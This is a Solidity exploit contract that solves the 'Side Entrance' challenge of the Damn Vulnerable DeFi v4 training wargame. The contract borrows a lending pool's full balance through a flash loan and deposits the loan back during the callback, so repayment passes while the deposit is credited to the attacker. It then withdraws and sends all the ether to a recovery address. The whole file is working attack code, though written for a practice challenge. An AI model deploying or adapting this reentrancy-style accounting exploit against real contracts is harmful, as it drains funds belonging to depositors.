// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;

    function deposit() external payable;

    function withdraw() external; 
}


contract SideEntranceLenderPoolAttacker {
    address public pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function flashLoan(address recovery) external {
        ISideEntranceLenderPool(pool).flashLoan(address(pool).balance);

        ISideEntranceLenderPool(pool).withdraw();

        (bool success, ) = recovery.call{value: address(this).balance}("");
        require(success);
    }

    function execute() external payable {
        ISideEntranceLenderPool(pool).deposit{value: msg.value}();
    }

    receive() external payable {}
}
